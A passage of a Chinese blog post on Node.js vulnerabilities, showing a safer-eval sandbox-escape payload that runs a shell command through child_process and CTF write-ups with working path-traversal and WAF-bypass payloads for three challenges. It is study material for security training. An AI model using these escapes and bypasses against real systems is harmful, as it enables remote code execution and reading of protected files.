+<pre><code class="plsql">setTimeout最多只能推迟执行2147483647毫秒（24.8天），超过这个时间会发生溢出，导致回调函数将在当前任务队列结束后立即执行
+</code></pre>
+<p> 我们传入一个大于2147483647的值即可执行next()到下一个位置<br>所以我们就可以通过get传入一个比2147483647大的值，然年使用post方式传入payload<br>safer-eval 1.3.6逃逸payload:</p>
+<pre><code class="plsql">const saferEval = require(&quot;./src/index&quot;);
+
+const theFunction = function () &#123;
+  const process = clearImmediate.constructor(&quot;return process;&quot;)();
+  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()
+&#125;;
+const untrusted = `($&#123;theFunction&#125;)()`;
+
+console.log(saferEval(untrusted));
+</code></pre>
+<p>在这里我们直接给e post传入一下内容:</p>
+<pre><code class="plsql">(function () &#123;
+  const process = clearImmediate.constructor(&quot;return process;&quot;)();
+  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()
+&#125;)()
+</code></pre>
+<p>搭建的docker环境不知道为什么没有成功执行命令，放一张别人的图叭<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668772542204-bf8936f4-0bf2-48b7-9fe6-112ba4a93c59.png" alt="o_20080607581121-1.png"></p>
+<h2 id="更多逃逸payload"><a href="#更多逃逸payload" class="headerlink" title="更多逃逸payload"></a>更多逃逸payload</h2><p><a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues?q=is:issue+author:XmiliaH+is:closed">https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed</a><br><a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p>
+<h1 id="一些有趣的挑战"><a href="#一些有趣的挑战" class="headerlink" title="一些有趣的挑战"></a>一些有趣的挑战</h1><h2 id="CSIVITU-2020-File-Library"><a href="#CSIVITU-2020-File-Library" class="headerlink" title="CSIVITU 2020-File Library"></a>CSIVITU 2020-<strong>File Library</strong></h2><p>容器地址:<a target="_blank" rel="noopener" href="https://github.com/csivitu/ctf-challenges/tree/master/web/File%20Library">https://github.com/csivitu/ctf-challenges/tree/master/web/File%20Library</a><br>我们得到了任务的源代码：</p>
+<pre><code class="javascript">const express = require(&#39;express&#39;);
+const path = require(&#39;path&#39;);
+const fs = require(&#39;fs&#39;);
+
+const app = express();
+
+const PORT = process.env.PORT || 3000;
+
+app.listen(PORT, () =&gt; &#123;
+   console.log(`Listening on port $&#123;PORT&#125;`);
+&#125;);
+
+app.get(&#39;/getFile&#39;, (req, res) =&gt; &#123;
+   let &#123; file &#125; = req.query;
+   console.log(&quot;file is: &quot;+file);
+   if (!file) &#123;
+       res.send(`file=$&#123;file&#125;\nFilename not specified!`);
+       return;
+   &#125;
+
+   try &#123;
+
+       if (file.includes(&#39; &#39;) || file.includes(&#39;/&#39;)) &#123;
+           res.send(`file=$&#123;file&#125;\nInvalid filename!`);
+           return;
+       &#125;
+   &#125; catch (err) &#123;
+       res.send(&#39;An error occured!&#39;);
+       return;
+   &#125;
+
+   if (!allowedFileType(file)) &#123;
+       res.send(`File type not allowed`);
+       return;
+   &#125;
+
+   if (file.length &gt; 5) &#123;
+       file = file.slice(0, 5);
+   &#125;
+
+   const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);
+  console.log(&quot;returnedFile: &quot;+returnedFile);
+   fs.readFile(returnedFile, (err) =&gt; &#123;
+       if (err) &#123;
+           if (err.code != &#39;ENOENT&#39;) console.log(err);
+           res.send(&#39;An error occured!&#39;);
+           return;
+       &#125;
+
+       res.sendFile(returnedFile);
+   &#125;);
+&#125;);
+
+app.get(&#39;/*&#39;, (req, res) =&gt; &#123;
+   res.sendFile(__dirname + &#39;/index.html&#39;);
+&#125;);
+
+function allowedFileType(file) &#123;
+   const format = file.slice(file.indexOf(&#39;.&#39;) + 1);
+console.log(&quot;index +1 is &quot;+file.indexOf(&#39;.&#39;) + 1);    
+console.log(&quot;format inside allowedfile is: &quot;+format);
+   if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) &#123;
+       return true;
+   &#125;
+
+   return false;
+&#125;
+</code></pre>
+<p>我添加了一些日志记录语句以方便操作，正如您所见，当我们访问**/getfile**时，我们可以在 get 参数中提供一个将为我们显示的文件名，但有一些限制，我们不能使用空格或“/”，只允许四个扩展名 (js|ts|c|cpp) 。<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668851120660-015dd3fc-8e23-42ce-86ae-08e0a10ec78c.png" alt="image.png"><br>仔细阅读源代码后，我很确定我们会使用 http 参数污染，因为没有检查 get 参数的类型，所以我们可以输入一个数组并尝试利用可能发生的不当行为。<br>假设我们输入以下数组：</p>
+<pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;,&quot;.&quot;,&quot;js&quot;]
+</code></pre>
+<ul>
+<li><strong>第一次检查</strong>：if (file.includes(‘ ‘) || file.includes(‘/‘))</li>
+</ul>
+<p>当 includes 应用于数组时，它会检查是否有一个字段等于传递的参数（在我们的例子中为“”和“/”），这里为 false，因此我们可以成功通过此检查</p>
+<ul>
+<li><strong>第二次检查</strong>：if (!allowedFileType(file))</li>
+</ul>
+<p>我们来看看这个函数的代码：</p>
+<pre><code class="javascript">function allowedFileType(file) &#123;
+const format = file.slice(file.indexOf(&#39;.&#39;) + 1);
+    if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) &#123;
+        return true;
+    &#125;
+
+    return false;
+&#125;
+</code></pre>
+<p>它将从 indexOf(“.”)+1 开始对我们的数组进行切片，所以在我们的例子中，结果将是我们数组的最后一个字段，即“js”，我们也将通过此检查：<br>以下行将删除数组的最后两个字段：</p>
+<pre><code class="javascript">if (file.length &gt; 5) &#123;
+  file = file.slice(0, 5);
+&#125;
+
+# &quot;Welcome to GeeksforGeeks&quot;.slice(0, 5)  ---&gt; Welcom
+</code></pre>
+<p>所以我们的数组将变成：</p>
+<pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;]
+</code></pre>
+<p>最后在解析路径后 returnedFile 将包含 /proc/self/cwd/flag.txt</p>
+<pre><code class="javascript">const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);
+</code></pre>
+<p><strong>注意：</strong>由于我们的“../../”字段，当前目录的__dirname 被忽略，而**/proc/self/cwd**等同于当前目录。<br>所以最后我们的数组将被解析为我们想要的路径，这是最终的有效载荷，它只是对我们之前所说的的一种解释：</p>
+<pre><code class="javascript">http://chall.csivit.com:30222/getfile?file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../proc/self/cwd/flag.txt&amp;file[]=.&amp;file[]=js
+</code></pre>
+<h2 id="corCTF2022-a-simple-waf"><a href="#corCTF2022-a-simple-waf" class="headerlink" title="corCTF2022 a simple waf"></a>corCTF2022 a simple waf</h2><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935506091-1813cc21-6778-4925-9957-d8eec87bba05.png"><br>挑战为我们提供了<a target="_blank" rel="noopener" href="https://github.com/thangpd3160/CTF-Writeup/tree/main/corCTF/2022/simplewaf">源代码</a>和一个Dockerfile. 由于 Instancer 只创建一个持续 3 分钟的挑战实例，这非常不方便，所以我使用提供的资源在本地构建和调试以玩这个挑战。<br>浏览网站localhost:3456，我们可以看到这只是一个简单的网页展示指定文件的内容。<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935640897-81cac506-2e2f-4d19-ac63-515f73604c5d.png" alt="image.png"><br>这个挑战的目标是读取flag.txt文件的内容……但以某种方式绕过includes(‘flag’)waf的检查。所有的挑战代码都可以在 看到main.js</p>
+<pre><code class="javascript">const express = require(&quot;express&quot;);
+const fs = require(&quot;fs&quot;);
+
+const app = express();
+
+const PORT = process.env.PORT || 3456;
+
+app.use((req, res, next) =&gt; &#123;
+    if([req.body, req.headers, req.query].some(
+        (item) =&gt; item &amp;&amp; JSON.stringify(item).includes(&quot;flag&quot;)
+    )) &#123;
+        return res.send(&quot;bad hacker!&quot;);
+    &#125;
+    next();
+&#125;);
+
+app.get(&quot;/&quot;, (req, res) =&gt; &#123;
+    try &#123;
+        res.setHeader(&quot;Content-Type&quot;, &quot;text/html&quot;);
+        res.send(fs.readFileSync(req.query.file || &quot;index.html&quot;).toString());       
+    &#125;
+    catch(err) &#123;
+        console.log(err);
+        res.status(500).send(&quot;Internal server error&quot;);
+    &#125;
+&#125;);
+
+app.listen(PORT, () =&gt; console.log(`web/simplewaf listening on port $&#123;PORT&#125;`));
+</code></pre>
+<p><strong>分析</strong><br>阅读源代码后，我想到了两个问题。</p>
+<ol>
+<li>如何绕过includes条件？（绝对……我们正在寻找的东西），以及</li>
+<li>readFileSync该函数可以采用什么类型的参数来读取文件？</li>
+</ol>
+<p>通过在 Google 上搜索，我发现了一篇关于<a target="_blank" rel="noopener" href="https://ahmed-belkahla.me/post/csictf2020/">NodeJS Bypass Filter CTF</a>的文章，它在某些时候类似于这个挑战：</p>
+<ul>
+<li>这两个挑战都没有验证输入的类型，这意味着我们可以将输入作为数组而不是字符串传递，并且</li>
+<li>这两个挑战都需要绕过includes函数才能到达标志！</li>
+</ul>
+<p>太棒了！认为我找到了正确的位置，我尝试了 payload file[]=x&amp;file[]=flag.txt。不幸的是，它无法绕过这个挑战的waf<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935762043-fff8116b-850a-4c5a-bdcd-db5e94a0d1a8.png" alt="image.png"><br>为什么它不能绕过waf？好吧，我发现这行代码的挑战之间有一个关键的不同点<br>(item) =&gt; item &amp;&amp; JSON.stringify(item).includes(“flag”)<br>simplewaf不采用原始输入来执行输入验证，而是预先将原始输入转换为 JSON 字符串<strong>。</strong>因此，该includes函数仍然可以检查转换后的字符串是否包含flag。<br>至此，我无论如何也想不出绕过这个includes函数……所以，我转到第二个问题，看看那个函数的NodeJS文档。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789510-8354252a-f6cc-463c-b632-bb7e60a1a1de.png" alt="image.png"><br>好的，所以路径参数可以是一个<string> | <Buffer> | <URL> | <integer>. 但是，请求查询值的类型始终是字符串。我们如何传入readFileSync函数 aURL或 aninteger或 a 以外的任何其他内容string？<br>起初想到，我尝试将字符串格式化为URL: <a target="_blank" rel="noopener" href="http://localhost:3456/wow.html%E3%80%82%E5%80%92%E9%9C%89%EF%BC%8C%E4%B8%8D%E8%A1%8C~![image.png](NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789961-8d941817-7645-436a-a08b-a27bfb04d986.png)">http://localhost:3456/wow.html。倒霉，不行~![image.png](NodeJs漏洞总结/1668935789961-8d941817-7645-436a-a08b-a27bfb04d986.png)</a><br>停止徒劳的猜测，我决定在<a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/main/lib/fs.js#L464">github</a>readFileSync上的 NodeJS 源代码中仔细查看该功能。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789036-6b7a5233-e982-4190-aaae-0a8ffc5c9972.png" alt="image.png"><br>第 469 行及以下的代码片段执行读取文件过程，无需深入研究。我们需要深入研究的要点是第 467 行的代码。通过研究fs.openSync函数来跟踪代码。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788506-b6f91f83-3bd6-43ed-ab40-d21fb43b860d.png" alt="image.png"><br>通过调查getValidatedPath功能继续关注。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788081-009143b9-094b-470d-b9c8-36f6f3ec9a1c.png" alt="image.png"><br>按住不放，这里会出现一些有趣的东西。因此，如果该fileURLOrPath值不为 null，并且其中有 existshref和origin，它将调用 to fileURLToPath，将fileURLOrPath值转换为 URL。这就是我想说的！我能感觉到我走的路是对的！<br>获得动力，我继续研究这个fileURLToPath功能。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935794727-c8ad1160-3801-48c0-b0d0-625d21dc379a.png" alt="image.png"><br>该值的一个附加条件fileURLOrPath是其协议必须是file:. 全部检查通过后，会调用相应的函数从URL中获取路径。由于我在 Linux 上调试，所以我继续研究该getPathFromURLPosix功能。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935795561-c49c1cd2-acc0-46b6-85c4-db4ded4c9806.png" alt="image.png"><br>再次检查此代码片段：hostname必须为空。但是，这里需要注意一件值得注意的事情，它将帮助我们绕过 simplewaf 的includes检查，那就是它将对<strong>simplewaf</strong>pathname执行 URL 解码以获取 URL。这意味着如果我们pathname从 Web 应用程序传递一个双 URL 编码值，它最终将文件路径变成纯文本。你猜怎么着？由于客户端传递给includes检查的值只是 URL 解码一次，我们也可以轻松绕过此检查。<br>好的，让我们总结一下将有效参数file作为 URL传递给函数readFileSync需要做的所有事情。</integer></URL></Buffer></string></p>
+<ul>
+<li>file不为空</li>
+<li>file.origin存在</li>
+<li>file.href存在</li>
+<li>file.protocol = ‘file:’</li>
+<li>file.hostname = ‘’</li>
+</ul>
+<p>绕过waf并获得标志的最终要求是：</p>
+<ul>
+<li>file.pathname是双重 URL 编码</li>
+</ul>
+<p><strong>解决方案</strong><br>根据上面的分析，我构造了如下的payload：<br>file[origin]=x&amp;file[href]=x&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=fla%2567.txt<br>我只是对字符进行双重 URL 编码g以绕过 waf。使用有效载荷，我们成功获得了测试标志。<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935796021-c337cfb2-2659-429c-aa5d-94fee9e55d4d.png" alt="image.png"><br>好吧，先拿真旗吧~<br>corctf{hmm_th4t_waf_w4snt_s0_s1mple}</p>
+<h2 id="祥云杯2022-RUSTwaf"><a href="#祥云杯2022-RUSTwaf" class="headerlink" title="祥云杯2022 RUSTwaf"></a>祥云杯2022 RUSTwaf</h2><pre><code class="javascript">const express = require(&#39;express&#39;);
+const app = express();
+const bodyParser = require(&quot;body-parser&quot;)
+const fs = require(&quot;fs&quot;)
+app.use(bodyParser.text(&#123;type: &#39;*/*&#39;&#125;));
+const &#123;  execFileSync &#125; = require(&#39;child_process&#39;);
+
+app.post(&#39;/readfile&#39;, function (req, res) &#123;
+    let body = req.body.toString();
+    let file_to_read = &quot;app.js&quot;;
+    const file = execFileSync(&#39;/app/rust-waf&#39;, [body], &#123;
+        encoding: &#39;utf-8&#39;
+    &#125;).trim();
+    try &#123;
+        file_to_read = JSON.parse(file)
+    &#125; catch (e)&#123;
+        file_to_read = file
+    &#125;
+    let data = fs.readFileSync(file_to_read);
+    res.send(data.toString());
+&#125;);
+
+app.get(&#39;/&#39;, function (req, res) &#123;
+    res.send(&#39;see `/src`&#39;);
+&#125;);
+
+
+
+app.get(&#39;/src&#39;, function (req, res) &#123;
+    var data = fs.readFileSync(&#39;app.js&#39;);
+    res.send(data.toString());
+&#125;);
+
+app.listen(3000, function () &#123;
+    console.log(&#39;start listening on port 3000&#39;);
+&#125;);
+</code></pre>
+<p>直接/readfile读源码</p>
+<pre><code class="javascript">use std::env;
+use serde::&#123;Deserialize, Serialize&#125;;
+use serde_json::Value;
+
+static BLACK_PROPERTY: &amp;str = &quot;protocol&quot;;
+
+#[derive(Debug, Serialize, Deserialize)]
+struct File&#123;
+    #[serde(default = &quot;default_protocol&quot;)]
+    pub protocol: String,
+    pub href: String,
+    pub origin: String,
+    pub pathname: String,
+    pub hostname:String
+&#125;
+
+pub fn default_protocol() -&gt; String &#123;
+    &quot;http&quot;.to_string()
+&#125;
+//protocol is default value,can&#39;t be customized
+pub fn waf(body: &amp;str) -&gt; String &#123;
+    if body.to_lowercase().contains(&quot;flag&quot;) ||  body.to_lowercase().contains(&quot;proc&quot;)&#123;
+        return String::from(&quot;./main.rs&quot;); //这里限制我们不能带有flag和proc字段
+    &#125;
+    if let Ok(json_body) = serde_json::from_str::&lt;Value&gt;(body) &#123;
+        if let Some(json_body_obj) = json_body.as_object() &#123;
+            if json_body_obj.keys().any(|key| key == BLACK_PROPERTY) &#123;
+                return String::from(&quot;./main.rs&quot;);    //这里限制我们的json字段不能带有protocol字段，但是下面限制我们是file结构体，这也就意味着我们一定要有protocol字段
+            &#125;
+        &#125;
+        //not contains protocol,check if struct is File
+        if let Ok(file) = serde_json::from_str::&lt;File&gt;(body) &#123;//限制我们只能是这个结构体
+            return serde_json::to_string(&amp;file).unwrap_or(String::from(&quot;./main.rs&quot;));
+        &#125;
+    &#125; else&#123;
+        //body not json
+        return String::from(body);
+    &#125;
+    return String::from(&quot;./main.rs&quot;);
+&#125;
+
+fn main() &#123;
+    let args: Vec&lt;String&gt; = env::args().collect();
+    println!(&quot;&#123;&#125;&quot;, waf(&amp;args[1]));  //这里把json的第二字段传进去
+&#125;
+</code></pre>
+<p>将payload以json格式传，但是这里用到的payload中存在protocol导致rust能检测到，要利用unicode 绕过<br>最终payload：</p>
+<pre><code class="javascript">&#123;&quot;hostname&quot;:&quot;&quot;,&quot;pathname&quot;:&quot;/fl%61g&quot;,&quot;protocol&quot;:&quot;file:&quot;,&quot;origin&quot;:&quot;fuckyou&quot;,&quot;pr\ud800otocol&quot;:&quot;file:&quot;,&quot;href&quot;:&quot;fuckyou&quot;&#125;
+</code></pre>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shawdow_bug/article/details/120072209">https://blog.csdn.net/shawdow_bug/article/details/120072209</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11791#toc-8">https://xz.aliyun.com/t/11791#toc-8</a></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://sakurahack-y.github.io/2022/11/20/NodeJs漏洞总结/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/node-js/">node_js</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Nodejs%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7"><span class="toc-number">1.</span> <span class="toc-text">Nodejs语言特性</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="toc-number">1.1.</span> <span class="toc-text">大小写特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83"><span class="toc-number">1.2.</span> <span class="toc-text">弱类型比较</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E6%AF%94%E8%BE%83"><span class="toc-number">1.2.1.</span> <span class="toc-text">大小比较</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E6%AF%94%E8%BE%83"><span class="toc-number">1.2.2.</span> <span class="toc-text">数组比较</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E6%9C%89%E4%B8%80%E4%BA%9B%E6%AF%94%E8%BE%83%E7%89%B9%E5%88%AB%E7%9A%84%E7%9B%B8%E7%AD%89%EF%BC%9A"><span class="toc-number">1.2.3.</span> <span class="toc-text">还有一些比较特别的相等：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">变量拼接：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MD5%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">MD5的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ES6%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">1.5.</span> <span class="toc-text">ES6模板字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.</span> <span class="toc-text">编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#16%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"><span class="toc-number">1.6.1.</span> <span class="toc-text">16进制编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unicode%E7%BC%96%E7%A0%81"><span class="toc-number">1.6.2.</span> <span class="toc-text">unicode编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base%E7%BC%96%E7%A0%81"><span class="toc-number">1.6.3.</span> <span class="toc-text">base编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Nodejs%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">Nodejs危险函数的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eval"><span class="toc-number">2.1.1.</span> <span class="toc-text">eval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#settimeout"><span class="toc-number">2.1.2.</span> <span class="toc-text">settimeout()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setinterval"><span class="toc-number">2.1.3.</span> <span class="toc-text">setinterval()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#function"><span class="toc-number">2.1.4.</span> <span class="toc-text">function()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">2.2.</span> <span class="toc-text">文件读写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nodejs%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0-RCE-bypass"><span class="toc-number">2.3.</span> <span class="toc-text">nodejs危险函数-RCE bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5"><span class="toc-number">2.3.1.</span> <span class="toc-text">字符拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-1"><span class="toc-number">2.3.2.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%8B%BC%E6%8E%A5"><span class="toc-number">2.3.3.</span> <span class="toc-text">模板拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0"><span class="toc-number">2.3.4.</span> <span class="toc-text">其他函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nodejs-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">3.</span> <span class="toc-text">nodejs-原型链污染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#merge%E6%93%8D%E4%BD%9C%E5%AF%BC%E8%87%B4%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">3.2.</span> <span class="toc-text">merge操作导致原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lodash"><span class="toc-number">3.3.</span> <span class="toc-text">lodash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ejs"><span class="toc-number">3.4.</span> <span class="toc-text">ejs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jade"><span class="toc-number">3.5.</span> <span class="toc-text">jade</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#squirrelly"><span class="toc-number">3.6.</span> <span class="toc-text">squirrelly</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nodejs%E4%B8%AD%E7%9A%84ssrf"><span class="toc-number">4.</span> <span class="toc-text">nodejs中的ssrf</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GYCTF2020-Node-Game"><span class="toc-number">4.2.</span> <span class="toc-text">[GYCTF2020]Node Game</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">5.</span> <span class="toc-text">vm沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">5.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vm%E9%80%83%E9%80%B8"><span class="toc-number">5.2.</span> <span class="toc-text">vm逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vm2"><span class="toc-number">5.3.</span> <span class="toc-text">vm2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#safe-eval%E6%A8%A1%E5%9D%97%E9%80%83%E9%80%B8"><span class="toc-number">5.4.</span> <span class="toc-text">safe-eval模块逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctf%E9%A2%98%E7%9B%AE"><span class="toc-number">5.5.</span> <span class="toc-text">ctf题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzNode"><span class="toc-number">5.5.1.</span> <span class="toc-text">[GKCTF2020]EZ三剑客-EzNode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E5%A4%9A%E9%80%83%E9%80%B8payload"><span class="toc-number">5.6.</span> <span class="toc-text">更多逃逸payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E6%8C%91%E6%88%98"><span class="toc-number">6.</span> <span class="toc-text">一些有趣的挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSIVITU-2020-File-Library"><span class="toc-number">6.1.</span> <span class="toc-text">CSIVITU 2020-File Library</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#corCTF2022-a-simple-waf"><span class="toc-number">6.2.</span> <span class="toc-text">corCTF2022 a simple waf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%A5%E4%BA%91%E6%9D%AF2022-RUSTwaf"><span class="toc-number">6.3.</span> <span class="toc-text">祥云杯2022 RUSTwaf</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">7.</span> <span class="toc-text">参考链接</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/">php原生类学习 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
